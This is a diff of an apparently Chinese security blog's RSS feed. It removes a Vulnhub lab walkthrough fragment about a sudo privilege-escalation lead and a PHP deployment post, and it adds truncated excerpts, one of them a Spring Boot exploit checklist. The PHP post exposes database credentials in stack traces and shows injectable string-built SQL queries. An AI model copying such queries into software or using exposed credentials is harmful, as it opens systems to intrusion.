-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;成功：&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
-    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
-
-用户 employee64 可以在 localhost 上运行以下命令：
-    (programmer) /usr/bin/unshare
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;所以用户employee64是拥有sudo权限；&lt;/p&gt;
-
-</description>
-        <pubDate>Wed, 02 Dec 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/GainPower/walkthrough/</link>
-        <guid isPermaLink="true">/blog/GainPower/walkthrough/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>Vulnhub</category>
-        
-        <category>笔记</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: PHP:部署的一揽子问题</title>
-        <description>&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475439 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:notice] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] PHP Notice:  Undefined index: step &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/
-html/code/BabyOnline1/setup/setupwizard.php on line 4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475577 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:error] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] 
-PHP Fatal error:  Uncaught Error: Class &lt;span class=&quot;s1&quot;&gt;'DOMDocument'&lt;/span&gt; not found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/html/code/BabyOnline1/setup/setupwizard.php:46&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;
-Stack trace:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0 {main}\n  thrown in /var/www/html/code/BabyOnline1/setup/setupwizard.php on line 46&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Wed Nov 25 17:21:46.224793 2020] [php7:error] [pid 11882] [client 10.211.55.2:53602] PHP Fatal error:  Uncaught Error: 
-Call to undefined function mysqli_connect() in 
-
-/var/www/html/code/BabyOnline1/utility/mysqli5.php:39\nStack trace:\n#0 /var/www/html/code/BabyOnline1/utility/fun.class.php(281): 
-Conn-&amp;gt;__construct('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8', true)\n#1 /var/www/html/code/BabyOnline1/utility/fun.class.php
-(255): Utility-&amp;gt;CreateDBConnect('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8')\n#2 /var/www/html/code/BabyOnline1/platform/php/
-ini.php(41): Utility-&amp;gt;__construct()\n#3 /var/www/html/code/BabyOnline1/platform/php/plat_manage.php(5): require_once('/var/www/html/c...')
-\n#4 {main}\n  thrown in /var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39, referer: http://10.211.55.4/platform/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;提示在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/fun.class.php(281)&lt;/code&gt;文件、
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/platform/php/ini.php(41)&lt;/code&gt;文件
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39&lt;/code&gt;文件&lt;/p&gt;
-
-&lt;p&gt;第一个fun.class.php文件是实现的日志写入数据库的功能；&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function WriterToDB($typeid,$clientAddress,$datetime,$file,$line,$function,$content)
-	{
-		global $utility;
-		if(is_array($content))
-		{
-			$conn = $utility-&amp;gt;CreateDBConnect($_SESSION[&quot;DB&quot;][&quot;Host&quot;],$_SESSION[&quot;DB&quot;][&quot;Port&quot;],$_SESSION[&quot;DB&quot;][&quot;User&quot;],$_SESSION[&quot;DB&quot;][&quot;Password&quot;],$_SESSION[&quot;DB&quot;][&quot;Name&quot;],$_SESSION[&quot;DB&quot;][&quot;Character&quot;]);
-			$conn-&amp;gt;Query(&quot;INSERT INTO `NMIOperationLog` (`Index`,`Operation`,`OperationTime`,`Description`,`ManageDomainUserInfo_Index`,`ManageDomain_Index`,`ManageDomainUserInfo_Identity`,`ManageDomains`,`SqlScript`)VALUES(null,'&quot;.$content[&quot;Operation&quot;].&quot;','&quot;.$content[&quot;OperationTime&quot;].&quot;','&quot;.addslashes($content[&quot;Description&quot;]).&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomain_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Identity&quot;].&quot;','&quot;.$content[&quot;ManageDomains&quot;].&quot;','&quot;.addslashes($content[&quot;SqlScript&quot;]).&quot;') &quot;);
-	
-			//$log-&amp;gt;Writer(1,&quot;NMI&quot;,strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time()),__FILE__,__LINE__,__FUNCTION__,mysql_error());
-			
-		}
-		return true;
-	}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;连库WriterToDB实现功能如上；同样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ini.php&lt;/code&gt;同样定义了数据库的配置信息包括类型、url和连接信息：&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define('LOGSAVETYPE',1);
-define('LOGLEVEL',1);
-
-define('DB_TYPE', &quot;mysql&quot;); 
-define('IMAGE_URL', &quot;http://61.191.35.32:8580/BabyOnline/&quot;);
-define('DB_SOURCEFILE_PATH',dirname(dirname(dirname(__FILE__))).&quot;/utility/dbsource.ini&quot;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbsource.ini&lt;/code&gt;文件里面则详细配置了jdbc的配置信息，就不单独放出来了；再来看看最后一个文件，同样是连接数据库，然后发现了一些有趣的：
-随意捡了一些构造函数：&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function QueryRecordCount($sqlstr)
-	{
-		if($this-&amp;gt;connect)
-		{
-			unset($row);
-			$row=$this-&amp;gt;FetchArray($this-&amp;gt;Query(&quot;SELECT count(1) as RecordCount FROM &quot;.$sqlstr.&quot; &quot;));
-			return ($row['RecordCount'] &amp;gt; 0 ? $row['RecordCount'] : 0);
-		}
-		else
-		{
-			return 0;
-		}
-	}
-
-
-if($link-&amp;gt;FetchArray($link-&amp;gt;query(&quot;SELECT * FROM User WHERE `Identity`='$UserId' AND AreaCode='$AreaCode'&quot;)))
-    {
-    ···
-    }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;咳咳，跑偏了，以上来看就直接修改ini文件就行了。&lt;/p&gt;
-</description>
-        <pubDate>Wed, 25 Nov 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/php-depoly/</link>
-        <guid isPermaLink="true">/blog/2020/php-depoly/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>php</category>
-        
-        <category>笔记</category>
-        
-      </item>
-    
-      <item>
         <title>daily: 谈谈被日本抛弃的 公 · 知 · 们</title>
-        <description>&lt;p&gt;&lt;i class=&quot;fa fa-quote-left&quot;&gt;&lt;/i&gt; 明治时代后期，在先后赢得中日甲午战争、日俄战争的胜利之后，日本越发膨胀起来。&lt;/p&gt;
+        <description> 明治时代后期，在先后赢得中日甲午战争、日俄战争的胜利之后，日本越发膨胀起来。
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;朝野都认为，日本是一个了不起的民族，”大日本主义”风行一时，这种意识形态鼓动着民众的民族主义，推动着日本对外扩张。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;可是，却有一个日本人勇敢地站出来主张 “小日本主义”，”通过改革内政，促进个人自由和活力，立足于产业主义，以达到利国富民之目的”。他尖锐地批判说，”大日本主义是把军事力量和武力征服放在首位的军国主义、专制主义、国家主义”，核心是”军事立国论”，对国家有害无益。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;这个敢于反对主流意见的人，就是石桥湛山。在日渐走向疯狂的近代日本历史上，他是一个引人注目的”异类”。他的故事是日本近代史的另一条线索，是日本理性力量的标志。
-&lt;i class=&quot;fa fa-quote-right&quot;&gt;&lt;/i&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
 
-&lt;p&gt;摘自：《 国 家 的 歧 路：日 本 帝 国 毁 灭 之 迷 》 ·  第二章 《 转 向 - “ 非 国 民 “ 》 马 国 川&lt;/p&gt;
-
-</description>
-        <pubDate>Wed, 11 Nov 2020 00:00:00 +0800</pubDate>
+  
+    朝野都认为，日本是一个了不起的民族，”大日本主义”风行一时，这种意识形态鼓动着民众的民族主义，推动着日本对外扩张。
+  
+  
+    ...</description>
+        <pubDate></pubDate>
         <link> https://www.sentrylab.cn/daily/2020/daily-post-test-article/</link>
         <guid isPermaLink="true">/daily/2020/daily-post-test-article/</guid>
         
         
         <category>daily</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 有关于网络安全行业的一些思考</title>
+        <description>Under construction
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+在当今网络安全行业趋于商业化的时代，如何能够保持一颗赤忱之心：
+
+
+  当今网络安全之趋势，当在国家安全的大前提下：
+    
+    ...</description>
+        <pubDate></pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/think-about-cyber-security/</link>
+        <guid isPermaLink="true">/blog/2020/think-about-cyber-security/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 不得不谈的：「Spring Boot」未授权渗透</title>
+        <description>Spring Boot Vulnerability Exploit CheckList
+
+Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list
+
+声明
+
+这是转载地址，
+若作者介意请联系：「...</description>
+        <pubDate></pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/Spring-boot/</link>
+        <guid isPermaLink="true">/blog/2020/Spring-boot/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>src</category>
+        
+        <category>CVE</category>
+        
+        <category>信息搜集</category>
+        
+        <category>笔记</category>
         
       </item>
     
